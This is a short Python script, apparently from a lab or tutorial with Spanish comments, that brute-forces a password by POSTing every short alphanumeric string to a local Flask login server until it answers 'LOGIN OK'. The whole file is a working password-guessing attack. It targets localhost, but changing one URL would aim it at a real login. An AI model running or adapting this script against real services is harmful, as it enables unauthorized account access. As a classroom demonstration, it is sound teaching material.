# brute_http.py
import itertools
import requests
import time

URL = "http://127.0.0.1:5000/"   # Tu servidor vulnerable local
charset = "abcdefghijklmnopqrstuvwxyz0123456789"
max_len = 3  # Puedes subirlo, pero 3 ya demuestra el ataque

print("Iniciando ataque de fuerza bruta al servidor Flask...")

attempt = 0

for length in range(1, max_len + 1):
    for combo in itertools.product(charset, repeat=length):
        guess = "".join(combo)
        attempt += 1

        data = {"password": guess}

        response = requests.post(URL, data=data)

        print(f"Intento {attempt}: {guess} -> {response.text}")

        if response.text.strip() == "LOGIN OK":
            print("\n¡Contraseña encontrada!: ", guess)
            exit()

        # Pausa mínima para no saturar tu PC
        time.sleep(0.05)

print("\nNo se encontró la contraseña en el rango probado.")
